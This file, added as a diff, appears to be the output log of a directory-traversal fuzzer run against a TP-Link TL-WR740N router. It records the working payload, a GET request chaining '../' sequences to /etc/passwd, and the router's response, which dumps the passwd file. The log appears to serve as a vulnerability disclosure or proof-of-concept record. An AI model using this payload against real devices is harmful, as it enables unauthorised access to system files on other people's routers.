@@ -1,0 +1,53 @@
+
+[+] Date and Time: 06-19-2012 18:28:59
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: 192.168.0.1
+[+] Protocol: N/A
+[+] Port: 80
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Traversal Engine DONE ! - Total traversal tests created: 610
+
+[+] Fuzz testing finished after 0.00 minutes (0 seconds)
+[+] Total Traversals found: 1
+
+[*] VULNERABLE PAYLOAD:
+GET /help/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.0
+Host: 192.168.0.1
+
+
+
+[*] RESPONSE:
+HTTP/1.1 200 OK
+Server: Router Webserver
+Connection: close
+WWW-Authenticate: Basic realm="TP-LINK Wireless Lite N Router WR740N"
+Content-Type: text/html
+
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<HTML>
+<HEAD><TITLE>TL-WR740N</TITLE>
+<META http-equiv=Pragma content=no-cache>
+<META http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
+<LINK href="/dynaform/css_help.css" rel=stylesheet type="text/css">
+<SCRIPT language="javascript" type="text/javascript"><!--
+if(window.parent == window){window.location.href="http://192.168.0.1";}
+function Click(){ return false;}
+document.oncontextmenu=Click;
+function doPrev(){history.go(-1);}
+//--></SCRIPT>
+root:x:0:0:root:/root:/bin/sh
+Admin:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/bin/sh
+daemon:x:2:2:daemon:/usr/sbin:/bin/sh
+adm:x:3:4:adm:/adm:/bin/sh
+lp:x:4:7:lp:/var/spool/lpd:/bin/sh
+sync:x:5:0:sync:/bin:/bin/sync
+shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
+operator:x:11:0:Operator:/var:/bin/sh
+nobody:x:65534:65534:nobody:/home:/bin/sh
+ap71:x:500:0:Linux User,,,:/root:/bin/sh
+
